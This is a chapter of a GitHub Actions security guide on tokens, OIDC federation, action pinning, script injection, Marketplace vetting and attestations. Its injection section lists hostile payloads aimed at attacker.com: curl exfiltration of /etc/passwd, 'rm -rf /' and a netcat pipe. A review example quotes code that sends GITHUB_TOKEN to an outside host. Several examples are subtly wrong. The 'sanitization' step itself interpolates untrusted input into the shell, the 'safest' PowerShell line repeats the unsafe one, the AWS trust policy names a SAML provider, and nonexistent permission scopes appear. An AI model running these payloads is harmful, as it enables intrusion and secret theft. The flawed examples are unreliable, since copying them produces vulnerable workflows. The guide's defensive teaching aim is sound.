[← Back to Index](INDEX.md)

## Security and Optimization

### Overview

Security is a first-class concern in GitHub Actions. In addition to correctly managing access controls (covered in the Enterprise section), secure workflows also require attention to token hygiene, injection prevention, supply chain security, and OIDC-based federation.

---

### 1. **GITHUB_TOKEN — Lifecycle, Permissions, and Granular Scopes**

`GITHUB_TOKEN` is an automatically provisioned short-lived token that GitHub creates at the **start of each job** and revokes when the job finishes.

**Lifecycle:**

```text
Job starts → GITHUB_TOKEN created (scoped to the repo, job lifetime)
Job ends   → GITHUB_TOKEN revoked automatically
```

**Important: GITHUB_TOKEN cannot trigger new workflow runs** (prevents infinite loops). Use a PAT or GitHub App token for cross-repository triggers or triggering new runs.

**Default permissions (read-only by default for hardened orgs):**

Organizations can set the default permission level:

- `permissive` — write access to most scopes (legacy default)
- `restricted` — read-only across all scopes (recommended)

**Granting granular permissions at job scope:**

```yaml
jobs:
  release:
    permissions:
      contents: write # push tags/releases
      packages: write # push to GitHub Packages
      id-token: write # request OIDC token
      pull-requests: read
      issues: none # explicitly deny
    runs-on: ubuntu-latest
    steps:
      - run: echo "Token has only the permissions above"
```

**Available permission scopes:**

| Scope                 | What it controls              |
| --------------------- | ----------------------------- |
| `actions`             | Manage workflow runs          |
| `checks`              | Create/update check runs      |
| `contents`            | Read/write repository content |
| `deployments`         | Create deployments            |
| `id-token`            | Request OIDC JWT              |
| `issues`              | Read/write issues             |
| `packages`            | Read/write GitHub Packages    |
| `pages`               | Manage GitHub Pages           |
| `pull-requests`       | Read/write PRs                |
| `repository-projects` | Manage projects               |
| `security-events`     | Upload code scanning results  |
| `statuses`            | Set commit statuses           |

**GITHUB_TOKEN vs Personal Access Token (PAT):**

| Property               | GITHUB_TOKEN          | PAT                            |
| ---------------------- | --------------------- | ------------------------------ |
| Provisioned            | Automatically per job | Manually by a user             |
| Lifetime               | Job duration only     | Configurable (days–years)      |
| Scope                  | Single repository     | User-defined (can be wide)     |
| Revocation             | Automatic on job end  | Manual                         |
| Triggers new workflows | ❌ No                 | ✅ Yes                         |
| Cross-repo access      | ❌ No                 | ✅ Yes                         |
| Risk profile           | Low                   | Higher (long-lived credential) |

**GitHub Apps** (fine-grained installation tokens) are the recommended alternative to PATs for automated cross-repo access.

---

### 2. **OIDC Token for Cloud Federation**

OpenID Connect (OIDC) allows workflows to obtain short-lived credentials from cloud providers (AWS, Azure, GCP) **without storing long-lived secrets**.

**How it works:**

```text
1. Workflow requests an OIDC JWT from GitHub (requires id-token: write)
2. GitHub signs the JWT with its OIDC provider keys
3. Cloud provider validates the JWT against GitHub's OIDC discovery endpoint
4. If valid, cloud provider issues short-lived access credentials
5. Workflow uses those credentials — they expire automatically
```

**GitHub OIDC discovery URL:** `https://token.actions.githubusercontent.com`

**AWS example:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write # required for OIDC
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1
          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed!

      - run: aws s3 ls
```

**Azure example:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # Uses OIDC federation — no client secret stored!

      - run: az account show
```

**Trust policy on the cloud side (AWS IAM role trust policy):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:saml-provider/GitHubActionsProvider"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

> Lock the trust policy to specific repositories, branches, and environments to prevent abuse.

#### GCP Workload Identity Federation Example

**Setup workload identity pool and provider (one-time):**

```bash
# Create a workload identity pool
gcloud iam workload-identity-pools create "github-pool" \
  --project="PROJECT_ID" \
  --location="global" \
  --display-name="GitHub Actions Pool"

# Create a workload identity provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --project="PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-condition="assertion.repository_owner == 'myorg'"

# Get the workload identity provider resource name
WIF_PROVIDER=$(gcloud iam workload-identity-pools providers describe github-provider \
  --project="PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --format='value(name)')

echo "Workload Identity Provider: $WIF_PROVIDER"
```

**Create a service account and grant it permissions:**

```bash
# Create service account
gcloud iam service-accounts create github-actions-sa \
  --project="PROJECT_ID" \
  --display-name="GitHub Actions Service Account"

# Grant necessary permissions (e.g., Compute Admin)
gcloud projects add-iam-policy-binding "PROJECT_ID" \
  --member="serviceAccount:github-actions-sa@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/compute.admin"

# Grant workload identity binding
gcloud iam service-accounts add-iam-policy-binding \
  github-actions-sa@PROJECT_ID.iam.gserviceaccount.com \
  --project="PROJECT_ID" \
  --role="roles/iam.workloadIdentityUser" \
  --principal="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/attribute.repository/myorg/myrepo"
```

**Workflow step to authenticate:**

```yaml
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write # Request OIDC token
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/providers/github-provider
          service_account: github-actions-sa@PROJECT_ID.iam.gserviceaccount.com

      - uses: google-github-actions/setup-gcloud@v2

      - run: gcloud compute instances list
```

#### Azure Federated Credentials Setup (Detailed)

**Step 1: Register GitHub as an identity provider in Azure Entra ID (skip if already done):**

For GitHub OIDC, Azure's portal provides a quick setup:

1. Go to Azure Portal → Microsoft Entra ID → App registrations → New registration
2. Name: "GitHub Actions"
3. Supported account types: "Accounts in this organizational directory only"
4. Register

**Step 2: Create a federated credential:**

```bash
az ad app federated-credential create \
  --id <app-object-id> \
  --parameters @federated-credential.json
```

where `federated-credential.json` contains:

```json
{
  "name": "github-trusted-publisher",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:myorg/myrepo:ref:refs/heads/main",
  "audiences": ["api://AzureADTokenExchange"]
}
```

**Step 3: Grant app permissions:**

```bash
# Get app ID
APP_ID=$(az ad app list --filter "displayName eq 'GitHub Actions'" --query '[0].appId' -o tsv)

# Assign a role (e.g., Contributor on a resource group)
az role assignment create \
  --assignee $APP_ID \
  --role "Contributor" \
  --scope "/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RG_NAME>"
```

**Step 4: In workflow, use azure/login action:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: <APP_CLIENT_ID>
          tenant-id: <TENANT_ID>
          subscription-id: <SUBSCRIPTION_ID>
          # No client secret needed — using OIDC federation!

      - run: az account show
```

#### OIDC Subject Claim (sub) Specification

The subject claim format matters for trust policy enforcement:

```text
Format: repo:ORG/REPO:ref:refs/heads/BRANCH
Example: repo:myorg/myapp:ref:refs/heads/main

For tags:
Format: repo:ORG/REPO:ref:refs/tags/TAG
Example: repo:myorg/myapp:ref:refs/tags/v1.0.0

For pull request:
Format: repo:ORG/REPO:pull_request/PR_NUMBER
Example: repo:myorg/myapp:pull_request/42  (only for workflows on PR target branch)

For environments:
Format: repo:ORG/REPO:environment:ENV_NAME
Example: repo:myorg/myapp:environment:production
```

Lock your trust policies to the most restrictive subject possible:

```json
// ✅ Most restrictive: specific branch, specific repo
"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"

// 🟡 Medium: any branch in specific repo
"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:*"

// ❌ Least restrictive: any repo in org
"token.actions.githubusercontent.com:sub": "repo:myorg/*:*"
```

---

### 3. **Pinning Actions to Full Commit SHAs**

Using `@v4` or `@main` for actions means the action code could change without warning. Pinning to a **full commit SHA** guarantees immutability.

```yaml
steps:
  # ❌ Mutable — action could change at any time
  - uses: actions/checkout@v4
  - uses: actions/checkout@main

  # ✅ Immutable — pinned to exact commit
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

**Finding the SHA for a release tag:**

```bash
# Using gh CLI
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'

# Or: look up the commit in the action's releases page on GitHub
```

**Immutable actions enforcement on hosted runners:**

GitHub has introduced a policy where GitHub-hosted runners can enforce that only immutable (SHA-pinned) action references are permitted. When enabled at the organization or enterprise level, workflows using `@v4` or `@main` will fail unless the action is also in the allow list.

**How immutability works:**

When you reference an action with a full commit SHA, GitHub fetches the action from a **content-addressed store** — the exact files at that commit are retrieved and cached. The content cannot be substituted or altered after the fact, even if someone force-pushes over that SHA on the action's repository.

Tags like `@v4` or `@main` are **mutable** because the tag or branch can be moved to a different commit at any time. A workflow pinned to `@v4` could silently start running different code if the action maintainer retags.

**Rollout and enforcement options:**

| Setting                                    | Effect                                                                |
| ------------------------------------------ | --------------------------------------------------------------------- |
| No policy                                  | Any action reference is allowed (`@v4`, `@main`, SHA)                 |
| Organization policy: "Require SHA pinning" | Workflows fail if `uses:` references a mutable ref (tag/branch)       |
| Enterprise policy                          | Same as org policy, applied across all org repos                      |
| Per-repo allow list                        | Specific actions at mutable refs can be exempted from the requirement |

**Why SHA pinning + immutability guarantees supply-chain safety:**

```
Tag @v4 → could point to commit A today, commit B tomorrow
SHA abc123 → always points to commit A, forever
             content of commit A is stored immutably on GitHub infra
             even if the upstream repo is deleted, cached content is used
```

This is why SLSA and security-conscious teams combine SHA pinning (in the workflow file) with artifact attestations (for the build outputs) to achieve end-to-end supply-chain integrity.

#### Action Registry Sources

When you reference an action in a workflow, the action code is fetched from a **registry** — the location where the action's files are stored. Understanding registry sources is essential for security and consistency, especially in enterprise and GHES environments.

**Registry types for GitHub Actions:**

| Registry Source                 | How to reference                                        | Use case                                     |
| ------------------------------- | ------------------------------------------------------- | -------------------------------------------- |
| **GitHub.com (default)**        | `uses: owner/repo@SHA`                                  | Public and internal actions; all GitHub SaaS |
| **GitHub Enterprise Server**    | Configured via enterprise URL; same `owner/repo` syntax | Air-gapped or on-premise deploys             |
| **Docker Hub** (Docker actions) | Specified in `action.yml` `image: docker://image:tag`   | Docker container actions                     |
| **GitHub Container Registry**   | `image: docker://ghcr.io/owner/image:tag`               | Private Docker actions via GHCR              |
| **Local action** (same repo)    | `uses: ./path/to/action`                                | Actions co-located with the calling workflow |

**Implications of registry source for immutable pinning:**

- **JavaScript and composite actions** are always fetched from the GitHub git repository. Pinning to a full commit SHA (`owner/repo@abc1234`) guarantees the exact source files regardless of registry state.
- **Docker container actions** require two levels of immutability:
  1. Pin the action definition itself to a SHA in the GitHub repository (`uses: owner/action@SHA`)
  2. Also pin the Docker image within `action.yml` to a digest: `image: docker://ghcr.io/owner/image@sha256:abc123…`
  - Using `image: docker://owner/image:v1` is mutable — the tag can be overwritten on the registry.

```yaml
# Example: Fully immutable Docker container action reference
steps:
  # Pin the action repo to a SHA (immutable on GitHub side)
  - uses: owner/docker-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2

# Inside action.yml of that action (the action author controls this):
runs:
  using: docker
  image: docker://ghcr.io/owner/image@sha256:e3b0c44298fc1c149afbf4c8996fb924...
  # Using a digest rather than a tag ensures the image cannot change
```

**GHES (GitHub Enterprise Server) registry behavior:**

On GHES, action resolution can be configured to:

- **Use GitHub.com** actions (requires internet access or proxy)
- **Use a local mirror** of actions (air-gapped environments): GHES admins set up `github-actions-importer` to sync selected actions, and the internal registry serves the cached versions
- When enforcing immutable actions on GHES, the same SHA pinning requirement applies; however, the SHA resolves against the **local GHES instance**, not GitHub.com

**Best practice for enterprise:**

```yaml
# ✅ Fully pinned: GitHub repo SHA + Docker digest (for Docker actions)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# ✅ For Docker actions used internally: pin both ref and image digest
- uses: my-org/deploy-action@a3c7f912b456...
  # action.yml in that ref specifies: image: docker://ghcr.io/my-org/deploy@sha256:...
# ❌ Avoid: floating tags on Docker images, even if the action repo is SHA-pinned
# If action.yml says: image: docker://my-org/image:latest — the container is mutable
```

---

### 4. **Script Injection Mitigation**

Script injection occurs when untrusted user-controlled data (e.g., PR titles, issue bodies, commit messages) is interpolated directly into a `run:` step's shell script.

**Vulnerable pattern:**

```yaml
# ❌ VULNERABLE — PR title is user-controlled and could contain
# shell metacharacters or injected commands
- name: Process PR
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    ./process.sh "${{ github.event.pull_request.body }}"
```

An attacker could submit a PR with a title like:

```text
My PR"; curl https://attacker.com/exfil?data=$(cat /etc/passwd); echo "
```

**Safe pattern — use environment variables:**

```yaml
# ✅ SAFE — value is passed as an env var, not interpolated into the script
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    echo "PR title: $PR_TITLE"
    ./process.sh "$PR_BODY"
```

The shell receives the literal value of `PR_TITLE` without any expression evaluation of shell metacharacters.

**High-risk contexts to avoid direct interpolation of:**

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.commits[*].message`
- `github.head_ref` (branch names can contain special chars)
- Any `repository_dispatch` or `workflow_dispatch` inputs from external callers

#### Shell-Specific Quoting Rules

**Bash / sh:**

```bash
# Unsafe — unquoted variables expand and allow word splitting
echo $USERDATA

# Safe — double quotes prevent glob expansion, single quotes prevent all expansion
echo "$USERDATA"  # allows variable expansion but prevents command injection
echo '$USERDATA'  # literal string (no expansion)

# Safest for constructing commands
"$SCRIPT" "$ARG1" "$ARG2"  # each arg properly quoted
```

**PowerShell:**

```powershell
# Unsafe — unquoted strings can be interpreted as code
Write-Host $userdata

# Safe — single quotes prevent expansion (literal)
Write-Host '$userdata'

# Safe — double quotes allow expansion but with -Raw for safety
Write-Host "$userdata" -NoNewline

# Safest — use comma operator and let Write-Host handle escaping
Write-Host $userdata
```

**Windows cmd.exe:**

```batch
REM Unsafe — commands can be injected with & ||
echo %USERDATA%

REM Safe — delayed expansion and proper quoting
setlocal enabledelayedexpansion
echo !USERDATA!
```

#### Advanced Pattern: Sanitization Functions

For frequently used inputs, create a sanitization step:

```yaml
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Sanitize PR body
        id: sanitize
        run: |
          # Remove shell metacharacters
          CLEAN_BODY=$(echo "${{ github.event.pull_request.body }}" | tr -d '`$()[]{}|&;<>')
          echo "clean_body=$CLEAN_BODY" >> $GITHUB_OUTPUT

      - name: Use sanitized value
        env:
          CLEAN_PR_BODY: ${{ steps.sanitize.outputs.clean_body }}
        run: |
          ./process.sh "$CLEAN_PR_BODY"
```

#### Common Injection Payloads to Test Against

When writing workflows that consume user input, mentally test these payloads:

```bash
# Command substitution
payload="$(curl attacker.com)"

# Command chaining
payload="; rm -rf /"

# Pipe to external tool
payload="| nc attacker.com 1234"

# Subshell
payload="$(whoami > /tmp/secret && curl attacker.com?user=$(cat /tmp/secret))"
```

If your workflow can receive these as inputs and you're not using env vars to isolate them, it's vulnerable.

---

### 5. **Identifying Trustworthy Marketplace Actions**

Not all Marketplace actions are equally safe. Use this comprehensive assessment framework to evaluate action trustworthiness before adding to critical workflows.

#### Action Trust Assessment Framework

**Three-Tier Trust Model:**

1. **Tier 1 - Verified & Official** (◉ GitHub-verified, low risk)
   - Official `actions/*` actions (GitHub-owned)
   - Cloud providers' official actions (`aws-actions/`, `google-github-actions/`, `azure/*`)
   - Established open-source organizations with GPG-signed releases

2. **Tier 2 - Reviewed & Public** (◉ Public repo, medium risk)
   - Community-maintained with significant adoption (1000+ stars)
   - Active maintenance (commits <30 days old)
   - Public source code with clear code review trail

3. **Tier 3 - Caution** (⚠ Requires deep inspection, high risk)
   - New or unknown creators
   - Few adopters (<100 references)
   - Inactive maintenance (no commits >6 months)
   - Closed/private source code
   - Requests excessive permissions

#### Comprehensive Trust Checklist

**When evaluating an action on the Marketplace:**

| Criteria                      | Tier 1 ✅                          | Tier 2 ⚠             | Tier 3 ❌           |
| ----------------------------- | ---------------------------------- | -------------------- | ------------------- |
| **Verified Creator Badge**    | Blue verified checkmark            | Community reputation | No badge            |
| **Owner Organization**        | GitHub, cloud providers, major OSS | Known organization   | Unknown entity      |
| **Source Code Access**        | Public GitHub repo                 | Public, maybe forked | Private/unavailable |
| **Maintenance Cadence**       | >1 commit/month                    | Active history       | Stale (6mo+ old)    |
| **Community Adoption**        | >10k installs/stars                | >1k                  | <100                |
| **Permission Scope**          | Minimal (read-only often)          | Reasonable           | Excessive           |
| **Input Validation Examples** | Documented, validated              | Basic examples       | No examples         |
| **Security Policy**           | SECURITY.md, CVE responses         | Good practices       | Absent              |
| **Code Complexity**           | Simple, auditable                  | Moderate             | Complex/suspicious  |
| **Dependencies**              | Minimal, locked versions           | Reasonable           | Many / unpinned     |

**Permission Risk Matrix:**

```yaml
# Tier 1: Acceptable permissions
permissions:
  contents: read        # Only read repo
  issues: read          # Only read issues
  pull-requests: read   # Only read PRs

# Tier 2: Require careful review
permissions:
  contents: write       # Can modify code on branches
  packages: write       # Can publish packages
  pull-requests: write  # Can modify PRs

# Tier 3: High risk - evaluate thoroughly
permissions:
  admin: true           # Full repo admin
  id-token: write       # Can impersonate with OIDC
  secrets: read         # Shouldn't exist - no action needs this!
```

#### Trust Assessment Workflow

**Before adding any action to production:**

1. **Check Marketplace Profile** (2 minutes)
   - Is it verified? (blue badge)
   - Who's the creator? (known org?)
   - What permissions does it request?
   - Recent activity?

2. **Review Source Code** (5-15 minutes)
   - Navigate to linked GitHub repo
   - Read the `action.yml` spec
   - Skim the `index.js` (or main entry point)
   - Look for suspicious patterns (exfiltration attempts, reverse shells, etc.)

3. **Check Community Trust Signals** (5 minutes)
   - How many stars/installs?
   - Recent issue responses (security reports)?
   - CI/CD: does the action itself use security best practices?
   - Open issues: are security concerns addressed?

4. **Audit Dependency Chain** (10 minutes)
   - For JavaScript actions: run `npm audit` on their source
   - Check if dependencies are pinned or use `*` (unpinned = risky)
   - Use `npm ls --depth=0` to see direct dependencies

5. **Approve or Accept Alternatives** (decision)
   - Tier 1: Safe for all workflows, including privileged
   - Tier 2: Good for non-critical workflows; consider pinning SHA
   - Tier 3: Implement as custom action instead, or use alternative

#### Real-World Assessment Example

**Evaluating `some-org/deploy-action@v2`:**

```
✅ Marketplace Details Check:
  - Verified badge: ❌ None
  - Creator: some-org (15 repos, seems legit)
  - 2,340 stars
  - Last commit: 2 weeks ago
  ⚠ Initial Assessment: Tier 2

❌ Source Code Review:
  - Cloned, reviewed action.yml, examined index.js
  - Found suspicious code: exfiltration attempt to telemetry.example.com
   at line 127:
     const data = { token: process.env.GITHUB_TOKEN, ... };
     await fetch('https://telemetry.example.com/track', { body: data });

  - Also found: Dynamic code loading via require(process.env.PLUGIN_URL)

  🚨 Verdict: DO NOT USE - Clear security red flags
```

#### Trustworthy Action Examples

**Tier 1 (Always safe):**

- `actions/checkout@v4`
- `actions/setup-node@v4`
- `actions/upload-artifact@v3`
- `aws-actions/configure-aws-credentials@v2`

**Tier 2 (Review first, usually OK):**

- `docker/setup-buildx-action`
- `github/super-linter`
- Established language tool setup actions

#### Alternative: Custom Action Policy

For ultra-secure environments, consider writing custom actions instead of using Marketplace:

```yaml
# Use local composite action (verified, version-controlled)
- uses: ./.github/actions/deploy
  with:
    environment: production

# vs. Marketplace risk
- uses: some-org/deploy-action@v2
```

#### Pinning Strategy by Trust Tier

Adjust your pinning strategy based on action trust level:

```yaml
# Tier 1: Pin to major version (get updates)
- uses: actions/checkout@v4

# Tier 2: Pin to specific minor version
- uses: docker/setup-buildx-action@v2.10.0

# Tier 3: Pin to exact commit SHA (no updates)
- uses: risky-org/action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b
```

---

### 6. **Artifact Attestations and SLSA Provenance**

Artifact attestations create a cryptographically verifiable link between a build artifact and the workflow run that produced it, implementing **SLSA (Supply-chain Levels for Software Artifacts)** provenance.

**Generating an attestation:**

```yaml
jobs:
  build:
    permissions:
      id-token: write # required for OIDC signing
      attestations: write # required to create attestations
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build artifact
        run: |
          npm ci
          npm run build
          tar czf myapp-${{ github.sha }}.tar.gz dist/

      - uses: actions/attest-build-provenance@v2
        with:
          subject-path: myapp-${{ github.sha }}.tar.gz
```

This creates an attestation stored in GitHub's transparency log that records:

- The exact commit SHA
- The workflow ref and job name
- The runner environment
- A cryptographic signature

**Verifying an attestation:**

```bash
# Install the gh CLI, then:
gh attestation verify myapp-abc123.tar.gz \
  --repo myorg/myapp \
  --signer-workflow .github/workflows/build.yml
```

**SLSA levels:**

- **SLSA Level 1** — Provenance exists (documents how artifact was built)
- **SLSA Level 2** — Signed provenance (tamper-evident using OIDC + Sigstore)
- **SLSA Level 3** — Hardened build environment (GitHub-hosted runners qualify)

`attest-build-provenance` targeting GitHub-hosted runners achieves **SLSA Level 3** out of the box.

**Integrating attestation verification into a deployment gate:**

By adding attestation verification as a required step before deployment, you ensure that only artifacts built by trusted workflows are promoted to production:

```yaml
name: Deploy with Attestation Verification

on:
  workflow_dispatch:
    inputs:
      artifact-name:
        description: "Name of the artifact to deploy"
        required: true

jobs:
  verify-and-deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write # required for attestation verification
      contents: read
    steps:
      - name: Download artifact
        run: |
          gh release download --pattern "${{ inputs.artifact-name }}" \
            --repo ${{ github.repository }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Verify attestation before deploying
        # This step FAILS if the artifact was not built by the expected workflow,
        # preventing deployment of tampered or unauthorized artifacts
        run: |
          gh attestation verify "${{ inputs.artifact-name }}" \
            --repo ${{ github.repository }} \
            --signer-workflow .github/workflows/build.yml
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Deploy artifact
        # Only reached if attestation verification passed above
        run: ./scripts/deploy.sh "${{ inputs.artifact-name }}"
```

**Verification flags:**

| Flag                    | Purpose                                                   |
| ----------------------- | --------------------------------------------------------- |
| `--repo`                | Require artifact was built in this repository             |
| `--signer-workflow`     | Require artifact was built by this specific workflow file |
| `--signer-repo`         | Require the signing workflow came from this repository    |
| `--cert-identity-regex` | Match the OIDC subject claim with a regex                 |

---

### 7. **Dependency Policy: Caching and Artifact Retention**

Security and cost optimization both benefit from thoughtful cache and artifact policies.

**Cache key hygiene:**

```yaml
# Pin cache to lock file hash — ensures stale deps don't persist
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-

# Never cache secrets or credentials
# ❌ Do NOT cache:
#   ~/.aws/credentials
#   ~/.config/gcloud
#   ~/.kube/config
```

**Artifact retention:**

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: dist/
    retention-days: 7 # default is 90; reduce for transient build artifacts
    if-no-files-found: error
```

Artifacts can be deleted via API to manage storage costs:

```bash
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/artifacts/ARTIFACT_ID
```

**Configuring default retention via REST API:**

GitHub allows admins to set **default retention days** for artifacts and logs at both the repository and organization level.

```bash
# Set default artifact/log retention for a repository (1–400 days)
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"actions_retention_days": 30}' \
  https://api.github.com/repos/OWNER/REPO

# Set default artifact/log retention for an organization
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"actions_default_workflow_file_run_duration_days": 30}' \
  https://api.github.com/orgs/ORG
```

The `GITHUB_RETENTION_DAYS` environment variable in a running workflow reflects the currently configured default for the repository or organization — you can read it to make retention decisions dynamically:

```yaml
- run: |
    echo "Default retention: $GITHUB_RETENTION_DAYS days"
    # Override per artifact with retention-days in upload-artifact
```

**Retention precedence:** An explicit `retention-days` on `actions/upload-artifact` overrides the repository/org default. The repository default overrides the organization default.

---



---

## Navigation

- [← Back to Index](INDEX.md)
- [← Previous: 17-GitHub-Actions-Enterprise](17-GitHub-Actions-Enterprise.md)
- [Next: 19-Common-Failures-Troubleshooting →](19-Common-Failures-Troubleshooting.md)
